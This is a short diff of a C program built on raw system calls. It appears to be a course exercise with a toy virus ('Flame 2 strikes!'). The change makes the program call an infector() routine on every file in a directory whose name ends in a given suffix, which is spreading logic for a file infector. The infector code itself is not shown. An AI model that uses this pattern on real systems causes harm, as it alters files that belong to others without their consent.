@@ -79,7 +79,7 @@ int main(int argc, char** argv){
 	}
 
 	// system_call(SYS_WRITE,STDOUT, "Flame 2 strikes!\n", 17);
-	ret = system_call(SYS_OPEN, "./", 0, 0);
+	ret = system_call(SYS_OPEN, "./bin", 0, 0);
 	
 	if(ret < 0)
 		system_call(SYS_EXIT, 0x55, 0, 0);
@@ -90,7 +90,6 @@ int main(int argc, char** argv){
 
 	if(aFlagPos){
 		infection();
-		infector("./bin");
 	}
 
 	if(sFlagPos)
@@ -106,6 +105,9 @@ int main(int argc, char** argv){
 			char* name = entp->buf;
 			if(name[strlen(name)-1] == *argv[suffixPos+1]){
 
+				if(aFlagPos){
+					infector(name);
+				}
 				printParam(name, "", 0);
 				if(debug){
 
